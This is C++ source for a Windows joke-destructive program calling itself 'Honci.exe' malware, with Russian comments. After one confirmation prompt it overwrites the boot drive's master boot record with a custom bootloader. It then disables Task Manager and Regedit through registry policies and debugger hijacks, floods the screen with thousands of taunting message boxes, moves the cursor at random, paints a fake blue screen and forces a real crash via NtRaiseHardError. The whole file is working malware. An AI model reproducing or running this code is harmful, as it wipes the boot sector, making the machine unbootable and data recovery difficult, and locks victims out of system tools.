#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#include <windows.h>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <process.h> 

#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif

// Глобальные переменные размеров экрана [1]
int screenWidth = 0; int screenHeight = 0;

// === ТВОЙ УЛЬТИМАТИВНЫЙ ГРАФИЧЕСКИЙ MBR-ЗАГРУЗЧИК (РОВНО 512 БАЙТ, СИГНАТУРА НА МЕСТЕ!) === [1]
const unsigned char mbr_animation[512] = {
    0xFA, 0xB8, 0x00, 0x10, 0x8E, 0xD8, 0x8E, 0xC0, 0xB8, 0x03, 0x00, 0xCD, 0x10, 0xB8, 0x13, 0x00,
    0xCD, 0x10, 0xBC, 0x00, 0x7C, 0x8E, 0xD0, 0xFB, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xDB, 0xBF,
    0x00, 0x00, 0xB9, 0x40, 0x3E, 0x31, 0xC0, 0xF3, 0xAB, 0x31, 0xC0, 0xBA, 0xC8, 0x03, 0xEE, 0x42,
    0xB9, 0x00, 0x03, 0x88, 0xC8, 0xEE, 0x31, 0xC0, 0xEE, 0x31, 0xC0, 0xEE, 0x40, 0xE2, 0xF3, 0xBA,
    0xDA, 0x03, 0xEC, 0xA8, 0x08, 0x75, 0xFB, 0xEC, 0xA8, 0x08, 0x74, 0xFB, 0x31, 0xDB, 0xBA, 0xC8,
    0x03, 0x31, 0xC0, 0xEE, 0x42, 0xB9, 0x00, 0x01, 0x8A, 0xC1, 0x02, 0xC3, 0xEE, 0x31, 0xC0, 0xEE,
    0x31, 0xC0, 0xEE, 0xE2, 0xF1, 0x43, 0xEB, 0xE0, 0x23, 0xFF, 0x26, 0xFF, 0x29, 0xFF, 0x2D, 0xFF,
    0x30, 0xFF, 0x33, 0xFF, 0x36, 0xFF, 0x3A, 0xFF, 0x3D, 0xFF, 0x40, 0xFF, 0x44, 0xFF, 0x47, 0xFF,
    0x4A, 0xFF, 0x4D, 0xFF, 0x51, 0xFF, 0x54, 0xFF, 0x57, 0xFF, 0x5B, 0xFF, 0x5E, 0xFF, 0x61, 0xFF,
    0x65, 0xFF, 0x68, 0xFF, 0x6B, 0xFF, 0x6E, 0xFF, 0x72, 0xFF, 0x75, 0xFF, 0x78, 0xFF, 0x7C, 0xFF,
    0x82, 0xFF, 0x86, 0xFF, 0x89, 0xFF, 0x8C, 0xFF, 0x93, 0xFF, 0x96, 0xFF, 0x99, 0xFF, 0xA0, 0xFF,
    0xA3, 0xFF, 0xA6, 0xFF, 0xAA, 0xFF, 0xAD, 0xFF, 0xB0, 0xFF, 0xB4, 0xFF, 0xB7, 0xFF, 0xBA, 0xFF,
    0xBE, 0xFF, 0xC1, 0xFF, 0xC4, 0xFF, 0xC7, 0xFF, 0xCB, 0xFF, 0xCE, 0xFF, 0xD1, 0xFF, 0xD4, 0xFE,
    0xE5, 0xD5, 0xFE, 0xD7, 0xD6, 0xF8, 0xD8, 0xD6, 0xF6, 0xD8, 0xD7, 0xF3, 0xD8, 0xD8, 0xF1, 0xD8,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x55, 0xAA
};

void DestroyAndWriteMBR() {
    HANDLE hRawDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hRawDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hRawDisk, mbr_animation, 512, &bytesWritten, NULL);
        CloseHandle(hRawDisk);
    }
}

void LockSystemDefenses() {
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul");
    system("reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul");
    system("reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /v Debugger /t REG_SZ /d \"cmd.exe /c msg * TaskManager не доступен без прав администратора! Получите права админа!\" /f > nul");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe\" /v Debugger /t REG_SZ /d \"cmd.exe /c msg * Regedit не доступен без прав администратора! Получите права админа!\" /f > nul");
}

// === ПОТОК ХАРАКТЕРНОГО ТЕЛЕПОРТА КУРСОРA ===
void CrazyCursorThread(void* pParams) {
    while (true) {
        int posX = rand() % screenWidth;
        int posY = rand() % screenHeight;
        SetCursorPos(posX, posY);
        Sleep(10); // Скорость перемещения курсора (каждые 10 мс)
    }
}

// === ПОТОК МОДАЛЬНОГО ОКНА С РОДНЫМ ДИЗАЙНОМ В СЛУЧАЙНОМ МЕСТЕ ===
void ShowCustomErrorBox(void* pParams) {
    // Включаем системный звук ошибки [1]
    MessageBeep(MB_ICONERROR);

    // Родное модальное окно без CBT-хуков (сохраняет рамки и системный вид) [1]
    MessageBoxW(
        NULL,
        L"Ахахахахахахах\nЯ заблокировал твой пк\nахахахахахахаах\nЯ буду везде!",
        L"Honci.exe УБИЛ ТВОЙ КОМП", 
        MB_OK | MB_ICONERROR | MB_TOPMOST | MB_SETFOREGROUND
    );

    _endthread();
}

bool ShowStartWarnings() {
    int msg1 = MessageBoxA(NULL, "Are you sure run to it malware?", "Honci.exe", MB_YESNO | MB_ICONQUESTION | MB_SYSTEMMODAL);
    
    if (msg1 == IDNO) {
        exit(0); 
    }

    Sleep(2000); 

    // СРАЗУ ИНИЦИАЛИЗИРУЕМ РАЗМЕРЫ ЭКРАНА ДЛЯ КУРСОРОВ И ОКОН [1]
    screenWidth = GetSystemMetrics(SM_CXSCREEN);
    screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // === ПРИНУДИТЕЛЬНЫЙ ВЫЗОВ ДЕСТРУКТИВНЫХ ФУНКЦИЙ ===
    DestroyAndWriteMBR();
    LockSystemDefenses();

    // 1. ИЗМЕНЕНИЕ ФОНА НА ЧЕРНЫЙ
    int desktopElements[] = { COLOR_DESKTOP };
    COLORREF desktopColors[] = { RGB(0, 0, 0) }; 
    SetSysColors(1, desktopElements, desktopColors);

    HKEY hColorsKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel\\Colors", 0, KEY_SET_VALUE, &hColorsKey) == ERROR_SUCCESS) {
        RegSetValueExA(hColorsKey, "Background", 0, REG_SZ, (const BYTE*)"0 0 0", 6);
        RegCloseKey(hColorsKey);
    }
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)"", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    srand(static_cast<unsigned int>(time(NULL)));

    // Запускаем безумную мышь в отдельном независимом потоке
    _beginthread(CrazyCursorThread, 0, NULL);

    // 2. ЭТАП 1: СПАВН СЛУЧАЙНЫХ «РОДНЫХ» ОКОН СО ЗВУКОМ (500 РАЗ) [1]
    for (int i = 0; i < 500; i++) {
        _beginthread(ShowCustomErrorBox, 0, NULL);
        Sleep(50);
    }

    Sleep(4000);

    // 3. ЭТАП 2: ОТРИСОВКА НЕЙТРАЛЬНОГО BSOD [1]
    HDC hdcScreen = GetDC(NULL);
    HBRUSH hBlueBrush = CreateSolidBrush(RGB(0, 0, 170));
    RECT screenRect = { 0, 0, screenWidth, screenHeight };

    FillRect(hdcScreen, &screenRect, hBlueBrush);
    SetTextColor(hdcScreen, RGB(255, 255, 255));
    SetBkMode(hdcScreen, TRANSPARENT);

    HFONT hFont = CreateFontA(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, 
                              ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, 
                              DEFAULT_QUALITY, FIXED_PITCH | FF_MODERN, "Lucida Console");
    SelectObject(hdcScreen, hFont);

    TextOutA(hdcScreen, 50, 50, "A problem has been detected and Windows has been shut down to prevent damage", 77);
    TextOutA(hdcScreen, 50, 80, "to your computer.", 17);
    TextOutA(hdcScreen, 50, 130, "CRITICAL_PROCESS_DIED", 21);
    TextOutA(hdcScreen, 50, 180, "Technical Information:", 22);
    TextOutA(hdcScreen, 50, 210, "*** STOP: 0x000000EF (0x00000000, 0x00000000, 0x00000000, 0x00000000)", 69);

    ReleaseDC(NULL, hdcScreen);
    DeleteObject(hBlueBrush);
    DeleteObject(hFont);

    Sleep(3000);

    // 4. ЭТАП 3: ЕЩЕ 1500 ОКОН СО ЗВУКАМИ ОШИБОК ПЕРЕД ФИНАЛОМ [1]
    for (int i = 0; i < 1500; i++) {
        _beginthread(ShowCustomErrorBox, 0, NULL);
        Sleep(15);
    }

    Sleep(3000);

    // 5. ЭТАП 4: КРАШ СИСТЕМЫ [1]
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll) {
        typedef NTSTATUS(NTAPI* pfnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
        typedef NTSTATUS(NTAPI* pfnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
        
        pfnRtlAdjustPrivilege RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        pfnNtRaiseHardError NtRaiseHardError = (pfnNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");

        if (RtlAdjustPrivilege && NtRaiseHardError) {
            BOOLEAN bEnabled;
            RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
            ULONG uResponse;
            NtRaiseHardError((NTSTATUS)0xC0000420L, 0, 0, NULL, 6, &uResponse);
        }
        FreeLibrary(hNtdll);
    }

    ExitProcess(0);
    return true; 
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ShowStartWarnings();
    return 0;
}
